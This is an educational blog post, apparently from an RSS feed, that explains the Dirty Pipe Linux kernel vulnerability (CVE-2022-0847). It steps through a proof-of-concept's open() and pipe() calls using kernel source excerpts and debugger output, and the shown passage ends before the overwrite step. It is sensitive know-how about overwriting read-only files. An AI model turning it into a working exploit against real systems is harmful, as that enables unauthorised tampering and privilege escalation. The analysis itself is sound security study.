&lt;/ul></content></item><item><title>Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847)</title><link>https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/</link><pubDate>Mon, 06 Jun 2022 19:57:03 +0200</pubDate><guid>https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/</guid><description>Intro This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described here. If you haven&amp;rsquo;t read the original publication yet, we&amp;rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann&amp;rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what&amp;rsquo;s going on we&amp;rsquo;d like to shed some light on specific kernel internals.</description><content>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described &lt;a href="https://dirtypipe.cm4all.com/">here&lt;/a>. If you haven&amp;rsquo;t read the original publication yet, we&amp;rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann&amp;rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what&amp;rsquo;s going on we&amp;rsquo;d like to shed some light on specific kernel internals. The aim of this post is to share our knowledge and to provide a resource for other interested individuals. The idea of this post is as follows: We take a small proof-of-concept (PoC) program and divide it into several stages. Each stage issues a system call (or syscall for short), and we will look inside the kernel to understand which actions and state changes occur in response to those calls. For this we use both, the kernel source code (&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source">elixir.bootlin.com&lt;/a>, version 5.17.9) and a kernel debugging setup (derived from &lt;a href="https://github.com/martinclauss/linux-kernel-debugging">linux-kernel-debugging&lt;/a>). The Dirty Pipe-specific debugging setup and the PoC code is provided in a &lt;a href="https://github.com/vobst/lkd-cve">GitHub&lt;/a> repository.&lt;/p>
&lt;h2 id="our-goal--disclaimer">Our Goal / Disclaimer&lt;/h2>
&lt;p>It&amp;rsquo;s important to talk about the goal of our investigation first:&lt;/p>
&lt;ul>
&lt;li>Do we want to understand how the Linux kernel works in general? Maybe not right now&amp;hellip;&lt;/li>
&lt;li>Do we want to know what the vulnerability is? Why it occurs? How it can be exploited? Yes!&lt;/li>
&lt;/ul>
&lt;p>It is important to keep in mind, what we want to achieve. The Linux kernel is a &lt;strong>very&lt;/strong> complex piece of software. We have to leave some blind spots, but that&amp;rsquo;s &lt;strong>absolutely okay&lt;/strong> :)&lt;/p>
&lt;p>Thus, when we show kernel source code we will often hide parts that are not directly relevant for our discussion to improve readability. In general, those parts may very well be security-relevant and we encourage you to follow the links to review the original code. In particular, if you want to find your own vulnerabilities or become a kernel hacker you should spend more time to understand (all) the mechanisms and details! ;)&lt;/p>
&lt;h2 id="page-cache">Page Cache&lt;/h2>
&lt;p>The page cache plays an important role in the Dirty Pipe vulnerability so let&amp;rsquo;s see what it is and how it works first.&lt;/p>
&lt;blockquote>
&lt;p>The physical memory is volatile and the common case for getting data into the memory is to read it from files. Whenever a file is read, the data is put into the page cache to avoid expensive disk access on the subsequent reads. Similarly, when one writes to a file, the data is placed in the page cache and eventually gets into the backing storage device. The written pages are marked as dirty and when Linux decides to reuse them for other purposes, it makes sure to synchronize the file contents on the device with the updated data. &lt;a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/concepts.html#page-cache">source&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>In particular, the above means that if any process on the system (or the kernel itself) requests data from a file that is already cached, the cached data is used instead of accessing the disk. Of course there are ways to influence this behavior by using flags (&lt;code>O_DIRECT | O_SYNC&lt;/code>) when opening a file, or by explicitly instructing the kernel to &lt;code>sync&lt;/code>hronize dirty pages. You could also discard the cached pages using the &lt;code>sysfs&lt;/code> pseudo file system: &lt;code># echo 1 &amp;gt; /proc/sys/vm/drop_caches&lt;/code>. However, in most situations the cached data is what is ultimately used by the kernel (and thus also the user processes).&lt;/p>
&lt;p>At this point we can already tease what the Dirty Pipe vulnerability is all about: It will allow us to overwrite the cached data of any file that we are allowed to &lt;strong>open&lt;/strong> (read-only access is sufficient), without the page cache actually marking the overwritten page as &amp;lsquo;dirty&amp;rsquo;. Thus, we can trick the system into thinking that the file contents changed (at least for a while) without leaving traces on disk.&lt;/p>
&lt;p>But let&amp;rsquo;s not get ahead of ourselves, the goal is after all to understand &lt;em>why&lt;/em> this happens. As we can see, the first thing our PoC does, is opening a file for reading, without any additional flags.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> tfd;
...
pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to open() file&amp;#34;&lt;/span>);
tfd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;./target_file&amp;#34;&lt;/span>, O_RDONLY);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L61">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The kernel function handling our &lt;code>open&lt;/code> user space call is &lt;code>do_sys_openat2()&lt;/code>. It attempts to get the file in the desired mode, and if everything succeeds it installs a new file descriptor that is backed by the file and returns it (the file descriptor is just an &lt;code>int&lt;/code>eger).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>
&lt;span style="color:#a6e22e">do_sys_openat2&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> dfd, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> __user &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">struct&lt;/span> open_how &lt;span style="color:#f92672">*&lt;/span>how)
{
&lt;span style="color:#66d9ef">struct&lt;/span> open_flags op;
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> build_open_flags(how, &lt;span style="color:#f92672">&amp;amp;&lt;/span>op);
&lt;span style="color:#66d9ef">struct&lt;/span> filename &lt;span style="color:#f92672">*&lt;/span>tmp;
...
tmp &lt;span style="color:#f92672">=&lt;/span> getname(filename);
...
fd &lt;span style="color:#f92672">=&lt;/span> get_unused_fd_flags(how&lt;span style="color:#f92672">-&amp;gt;&lt;/span>flags);
...
&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>f &lt;span style="color:#f92672">=&lt;/span> do_filp_open(dfd, tmp, &lt;span style="color:#f92672">&amp;amp;&lt;/span>op); &lt;span style="color:#75715e">// lolcads: maybe follow ...
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// but don&amp;#39;t get lost ;)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>...
&lt;span style="color:#66d9ef">if&lt;/span> (IS_ERR(f)) { &lt;span style="color:#75715e">// lolcads: e.g. permission checks failed, doesn&amp;#39;t exist...
&lt;/span>&lt;span style="color:#75715e">&lt;/span> put_unused_fd(fd);
fd &lt;span style="color:#f92672">=&lt;/span> PTR_ERR(f);
} &lt;span style="color:#66d9ef">else&lt;/span> {
fsnotify_open(f);
fd_install(fd, f);
}
putname(tmp);
&lt;span style="color:#66d9ef">return&lt;/span> fd; &lt;span style="color:#75715e">// lolcads: breakpoint 1
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/open.c#L1198">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Following the call to &lt;code>do_filp_open()&lt;/code> bears the danger of getting lost in the jungle of the (virtual) file system. To avoid going down that rabbit hole we place our first breakpoint on the &lt;code>return&lt;/code> statement. This gives us the opportunity to find the &lt;code>struct file&lt;/code> that is backing the file descriptor our PoC process receives.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> file {
...
&lt;span style="color:#66d9ef">struct&lt;/span> path f_path;
&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>f_inode;
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations &lt;span style="color:#f92672">*&lt;/span>f_op;
...
&lt;span style="color:#66d9ef">struct&lt;/span> address_space &lt;span style="color:#f92672">*&lt;/span>f_mapping;
...
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/fs.h#L956">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Importantly, the &lt;code>f_mapping&lt;/code> field leads us to the &lt;code>struct address_space&lt;/code> that represents the page cache object associated to the file. The &lt;code>a_ops&lt;/code> field points to implementations of typical operations one might want to perform on a page cache object e.g., reading ahead, marking pages as dirty or writing back dirty pages, and so on.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> address_space {
&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>host;
&lt;span style="color:#66d9ef">struct&lt;/span> xarray i_pages;
...
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> nrpages;
pgoff_t writeback_index;
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> address_space_operations &lt;span style="color:#f92672">*&lt;/span>a_ops;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> flags;
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/fs.h#L450">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The actual cached data lies on one or more pages somewhere in physical memory. Each and every page of physical memory is described by a &lt;code>struct page&lt;/code>. An &lt;a href="https://lwn.net/Articles/745073/">extendable array&lt;/a> (&lt;code>struct xarray&lt;/code>) containing pointers to those page structs can be found in the &lt;code>i_pages&lt;/code> field of the &lt;code>struct address_space&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> page {
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> flags;
...
&lt;span style="color:#75715e">/* Page cache and anonymous pages */&lt;/span>
&lt;span style="color:#66d9ef">struct&lt;/span> address_space &lt;span style="color:#f92672">*&lt;/span>mapping;
pgoff_t index; &lt;span style="color:#75715e">/* Our offset within mapping. */&lt;/span>
...
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * If the page can be mapped to userspace, encodes the number
&lt;/span>&lt;span style="color:#75715e"> * of times this page is referenced by a page table.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
atomic_t _mapcount;
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * If the page is neither PageSlab nor mappable to userspace,
&lt;/span>&lt;span style="color:#75715e"> * the value stored here may help determine what this page
&lt;/span>&lt;span style="color:#75715e"> * is used for. See page-flags.h for a list of page types
&lt;/span>&lt;span style="color:#75715e"> * which are currently stored here.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> page_type;
...
&lt;span style="color:#75715e">/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */&lt;/span>
atomic_t _refcount;
...
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * On machines where all RAM is mapped into kernel address space,
&lt;/span>&lt;span style="color:#75715e"> * we can simply calculate the virtual address. On machines with
&lt;/span>&lt;span style="color:#75715e"> * highmem some memory is mapped into kernel virtual memory
&lt;/span>&lt;span style="color:#75715e"> * dynamically, so we need a place to store that address.
&lt;/span>&lt;span style="color:#75715e"> * Note that this field could be 16 bits on x86 ... ;)
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * Architectures with slow multiplication can define
&lt;/span>&lt;span style="color:#75715e"> * WANT_PAGE_VIRTUAL in asm/page.h
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>virtual; &lt;span style="color:#75715e">/* Kernel virtual address (NULL if
&lt;/span>&lt;span style="color:#75715e"> not kmapped, ie. highmem) */&lt;/span>
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/mm_types.h#L72">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The last comment gives a hint at how to find the actual page of physical memory described by this struct within the kernel&amp;rsquo;s virtual address space. (The kernel maps all of physical memory into its virtual address space so we know its &lt;em>somewhere&lt;/em>. Refer to the &lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/Documentation/x86/x86_64/mm.rst">documentation&lt;/a> for more details.)&lt;/p>
&lt;pre tabindex="0">&lt;code>========================================================================================================================
Start addr | Offset | End addr | Size | VM area description
========================================================================================================================
...
ffff888000000000 | -119.5 TB | ffffc87fffffffff | 64 TB | direct mapping of all physical memory (page_offset_base)
...
&lt;/code>&lt;/pre>&lt;p>The key to finding the &amp;lsquo;needle in the haystack&amp;rsquo; is another region of the kernel&amp;rsquo;s virtual address space.&lt;/p>
&lt;blockquote>
&lt;p>The sparse vmemmap uses a virtually mapped memory map to optimize pfn_to_page and page_to_pfn operations. There is a global struct page *vmemmap pointer that points to a virtually contiguous array of struct page objects. A PFN is an index to that array and the offset of the struct page from vmemmap is the PFN of that page. &lt;a href="https://www.kernel.org/doc/html/latest/vm/memory-model.html">source&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>========================================================================================================================
Start addr | Offset | End addr | Size | VM area description
========================================================================================================================
...
ffffe90000000000 | -23 TB | ffffe9ffffffffff | 1 TB | ... unused hole
ffffea0000000000 | -22 TB | ffffeaffffffffff | 1 TB | virtual memory map (vmemmap_base)
ffffeb0000000000 | -21 TB | ffffebffffffffff | 1 TB | ... unused hole
...
&lt;/code>&lt;/pre>&lt;p>In the debugger we can confirm that the address of the &lt;code>struct page&lt;/code> associated to the &lt;code>struct address_space&lt;/code> of the &lt;code>target_file&lt;/code> our &lt;code>poc&lt;/code> process opened indeed lies within this range.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct task_struct at 0xffff888103a71c80
&amp;gt; 'pid': 231
&amp;gt; 'comm': &amp;quot;poc&amp;quot;, '\000' &amp;lt;repeats 12 times&amp;gt;
struct file at 0xffff8881045b0800
&amp;gt; 'f_mapping': 0xffff8881017d9460
&amp;gt; filename: target_file
struct address_space at 0xffff8881017d9460
&amp;gt; 'a_ops': 0xffffffff82226ce0 &amp;lt;ext4_aops&amp;gt;
&amp;gt; 'i_pages.xa_head' : 0xffffea0004156880 &amp;lt;- here!
&lt;/code>&lt;/pre>&lt;p>The kernel implements the translation of this address into a position in the contiguous mapping of all physical memory using a series of macros that hide behind a call to &lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/mm.h#L1712">&lt;code>lowmem_page_address / page_to_virt&lt;/code>&lt;/a>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define page_to_virt(x) __va(PFN_PHYS(page_to_pfn(x)))
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define page_to_pfn __page_to_pfn
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define __page_to_pfn(page) (unsigned long)((page) - vmemmap) &lt;/span>&lt;span style="color:#75715e">// (see .config: CONFIG_SPARSEMEM_VMEMMAP=y)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define vmemmap ((struct page *)VMEMMAP_START)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e"># define VMEMMAP_START vmemmap_base &lt;/span>&lt;span style="color:#75715e">// (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define PFN_PHYS(x) ((phys_addr_t)(x) &amp;lt;&amp;lt; PAGE_SHIFT)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define PAGE_SHIFT 12
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define __va(x) ((void *)((unsigned long)(x)+PAGE_OFFSET))
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define PAGE_OFFSET ((unsigned long)__PAGE_OFFSET)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define __PAGE_OFFSET page_offset_base &lt;/span>&lt;span style="color:#75715e">// (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y)
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>When following the macros, make sure to consider your architecture (e.g., x86) and check for compile time definitions in the &lt;code>.config&lt;/code> file of your build (e.g., &lt;code>CONFIG_DYNAMIC_MEMORY_LAYOUT=y&lt;/code>). The values of &lt;code>vmemmap_base&lt;/code> and &lt;code>page_offset_base&lt;/code> are in general effected by &lt;a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization#Kernel_address_space_layout_randomization">KASLR&lt;/a> but can be determined at runtime e.g., by using the debugger.&lt;/p>
&lt;p>Equipped with this knowledge, we can &lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_scripts_gdb/lkd/structs.py#L158">script the debugger&lt;/a> to do this calculation for us and print the cached data of the file we opened.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct page at 0xffffea0004156880
&amp;gt; virtual: 0xffff8881055a2000
&amp;gt; data: b'File owned by root!\n'[...]b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
&lt;/code>&lt;/pre>&lt;p>Inspecting the file permissions confirms that we are indeed not allowed to write to it.&lt;/p>
&lt;p>&lt;code>-rw-r--r-- 1 root root 20 May 19 20:15 target_file&lt;/code>&lt;/p>
&lt;p>Next, we are going to explore the second kernel subsystem involved in the Dirty Pipe vulnerability.&lt;/p>
&lt;h2 id="pipes-general">Pipes (general)&lt;/h2>
&lt;p>Pipes are a unidirectional inter-process communication (IPC) mechanism found in UNIX-like operating systems. In essence, a pipe is a buffer in kernel space that is accessed by processes through file descriptors. Unidirectionality means that there are two types of file descriptors, &lt;em>read&lt;/em> and &lt;em>write&lt;/em> ones:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> pipefds[&lt;span style="color:#ae81ff">2&lt;/span>];
pipe(pipefds);
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code> ┌───────────────────┐
write() ---&amp;gt; pipefds[1] │&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;│ pipefds[0] ---&amp;gt; read()
└───────────────────┘
&lt;/code>&lt;/pre>&lt;p>Upon creating a pipe the calling process receives both file descriptors, but usually it proceeds by distributing one or both of the file descriptors to other processes (e.g., by &lt;code>fork/clone&lt;/code>ing or through UNIX domain &lt;code>socket&lt;/code>s) to facilitate IPC. They are, for example, used by shells to connect stdout and stdin of the launched sub-processes.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ strace -f sh -c 'echo &amp;quot;Hello world&amp;quot; | wc' 2&amp;gt;&amp;amp;1 | grep -E &amp;quot;(pipe|dup2|close|clone|execve|write|read)&amp;quot;
...
sh: pipe([3, 4]) = 0 // parent shell creates pipe
sh: clone(...) // spawn child shell that will do echo (build-in command)
sh: close(4) = 0 // parent shell does not need writing end anymore
echo sh: close(3) // close reading end
echo sh: dup2(4, 1) = 0 // set stdout equal to writing end
echo sh: close(4) // close duplicate writing end
echo sh: write(1, &amp;quot;Hello world\n&amp;quot;, 12) = 12 // child shell performs write to pipe
...
sh: clone(...) // spawn child shell that will later execve wc
sh: close(3) = 0 // parent shell does not need reading end anymore
...
wc sh: dup2(3, 0) = 0 // set stdin equal to reading end
wc sh: close(3) = 0 // close duplicate reading end
wc sh: execve(&amp;quot;/usr/bin/wc&amp;quot;, [&amp;quot;wc&amp;quot;],...) // exec wc
wc: read(0, &amp;quot;Hello world\n&amp;quot;, 16384) = 12 // wc reads from pipe
...
&lt;/code>&lt;/pre>&lt;p>We mostly care about anonymous pipes as seen in the example above but there are also named pipes (see, e.g., &lt;a href="https://www.linuxjournal.com/article/2156">here&lt;/a>)&lt;/p>
&lt;p>Check out the excellent book &lt;em>The Linux Programming Interface&lt;/em> by Michael Kerrisk, Chapter 44 &amp;ldquo;Pipes and FIFOs&amp;rdquo; for more information and examples.&lt;/p>
&lt;h2 id="pipes-initialization">Pipes (initialization)&lt;/h2>
&lt;p>After opening the target file, our PoC process proceeds by creating a pipe:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> pipefds[&lt;span style="color:#ae81ff">2&lt;/span>];
...
pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to create pipe()&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (pipe(pipefds)) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L70">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Let&amp;rsquo;s investigate what the kernel does to provide the pipe functionality.&lt;/p>
&lt;h3 id="overview">Overview&lt;/h3>
&lt;p>Our system call is handled by the kernel function &lt;code>do_pipe2&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">SYSCALL_DEFINE1(pipe, &lt;span style="color:#66d9ef">int&lt;/span> __user &lt;span style="color:#f92672">*&lt;/span>, fildes)
{
&lt;span style="color:#66d9ef">return&lt;/span> do_pipe2(fildes, &lt;span style="color:#ae81ff">0&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1026">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">do_pipe2&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> __user &lt;span style="color:#f92672">*&lt;/span>fildes, &lt;span style="color:#66d9ef">int&lt;/span> flags)
{
&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>files[&lt;span style="color:#ae81ff">2&lt;/span>];
&lt;span style="color:#66d9ef">int&lt;/span> fd[&lt;span style="color:#ae81ff">2&lt;/span>];
&lt;span style="color:#66d9ef">int&lt;/span> error;
error &lt;span style="color:#f92672">=&lt;/span> __do_pipe_flags(fd, files, flags);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>error) {
&lt;span style="color:#66d9ef">if&lt;/span> (unlikely(copy_to_user(fildes, fd, &lt;span style="color:#66d9ef">sizeof&lt;/span>(fd)))) {
fput(files[&lt;span style="color:#ae81ff">0&lt;/span>]);
fput(files[&lt;span style="color:#ae81ff">1&lt;/span>]);
put_unused_fd(fd[&lt;span style="color:#ae81ff">0&lt;/span>]);
put_unused_fd(fd[&lt;span style="color:#ae81ff">1&lt;/span>]);
error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>EFAULT;
} &lt;span style="color:#66d9ef">else&lt;/span> {
fd_install(fd[&lt;span style="color:#ae81ff">0&lt;/span>], files[&lt;span style="color:#ae81ff">0&lt;/span>]);
fd_install(fd[&lt;span style="color:#ae81ff">1&lt;/span>], files[&lt;span style="color:#ae81ff">1&lt;/span>]);
}
}
&lt;span style="color:#66d9ef">return&lt;/span> error;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1004">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Here we can see that two integer file descriptors, backed by two distinct files, are created. One for the reading &lt;code>fd[0]&lt;/code>, and one for the writing &lt;code>fd[1]&lt;/code> end of the pipe. The descriptors are also copied from the kernel to user space &lt;code>copy_to_user(fildes, fd, sizeof(fd))&lt;/code>, where &lt;code>fildes&lt;/code> is the user space pointer we specified with the call to &lt;code>pipe(pipefds)&lt;/code> in our PoC.&lt;/p>
&lt;p>Following the call to &lt;code>__do_pipe_flags()&lt;/code> reveals which data structures the kernel uses to implement our pipe. We summarized the relevant structures and their relationships in the following figure:&lt;/p>
&lt;pre tabindex="0">&lt;code> ┌──────────────────┐
┌──────────────────────┐ ┌►│struct pipe_buffer│
┌────────────────────────┐ ┌──►│struct pipe_inode_info│ │ │... │
┌───► │struct file │ │ │ │ │ │page = Null │
│ │ │ │ │... │ │ │... │
File desciptor table │ │... │ │ │ │ │ ├──────────────────┤
│ │ │ │ │head = 0 │ │ │struct pipe_buffer│
int fd │ struct file *f │ │f_inode ───────────────┼──┐ │ │ │ │ │... │
──────────┼───────────────── │ │ │ │ │ │tail = 0 │ │ │page = Null │
... │ ... │ │fmode = O_RDONLY | ... │ │ ┌─────────────┐ │ │ │ │ │... │
│ │ │ │ ├─►│struct inode │ │ │ring_size = 16 │ │ ├──────────────────┤
pipefd_r │ f_read ──────┘ │... │ │ │ │ │ │ │ │ │ ... │
│ └────────────────────────┘ │ │... │ │ │... │ │ ├──────────────────┤
pipefd_w │ f_write ──────┐ │ │ │ │ │ │ │ │struct pipe_buffer│
│ │ ┌────────────────────────┐ │ │i_pipe ─────┼─┘ │bufs ─────────────────┼──┘ │... │
... │ ... └───► │struct file │ │ │ │ │ │ │page = Null │
│ │ │ │ │... │ │... │ │... │
│ │... │ │ │ │ └──────────────────────┘ └──────────────────┘
│ │ │ │i_fop ──────┼─┐
│f_inode ───────────────┼──┘ │ │ │ ┌─────────────────────────────────────┐
│ │ │... │ └──►│struct file_operations │
│fmode = O_WRONLY | ... │ └─────────────┘ │ │
│ │ │... │
│... │ │ │
└────────────────────────┘ │read_iter = pipe_read │
│ │
│write_iter = pipe_write │
│ │
│... │
│ │
│splice_write = iter_file_splice_write│
│ │
│... │
└─────────────────────────────────────┘
&lt;/code>&lt;/pre>&lt;p>The two integer file descriptors, representing the pipe in user space, are backed by two &lt;code>struct file&lt;/code>s that only differ in their permission bits. In particular, they both refer to the same &lt;code>struct inode&lt;/code>.&lt;/p>
&lt;blockquote>
&lt;p>The inode (index node) is a data structure in a Unix-style file system that describes a file-system object such as a file or a directory. Each inode stores the attributes and disk block locations of the object&amp;rsquo;s data. File-system object attributes may include metadata (times of last change, access, modification), as well as owner and permission data.
[&amp;hellip;]
A directory is a list of inodes with their assigned names. The list includes an entry for itself, its parent, and each of its children. &lt;a href="https://en.wikipedia.org/wiki/Inode">source&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>The &lt;code>i_fop&lt;/code> field of the inode contains a pointer to a &lt;code>struct file_operations&lt;/code>. This structure holds function pointers to the implementations of the various operations that can be performed on the pipe. Importantly, those include the functions the kernel will use to handle a process' request to &lt;code>read()&lt;/code> or &lt;code>write()&lt;/code> the pipe.&lt;/p>
